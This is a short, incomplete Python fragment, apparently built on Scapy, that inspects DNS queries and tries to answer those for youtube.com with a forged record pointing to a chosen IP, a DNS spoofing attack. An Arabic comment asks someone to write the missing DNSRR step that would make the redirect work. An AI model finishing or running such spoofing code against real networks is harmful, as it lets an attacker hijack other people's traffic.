...
target_domain = "https://www.youtube.com"
redirect_ip = ""
...
def dns_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        ...
        if dns_query.lower() == target_domain:
            DNSRR(rdata=redirect_ip)# انا ما اعرف إش اسوي هنا عشان يحوله إلى redirect_ip انت سوي دالة DNSRR فقط
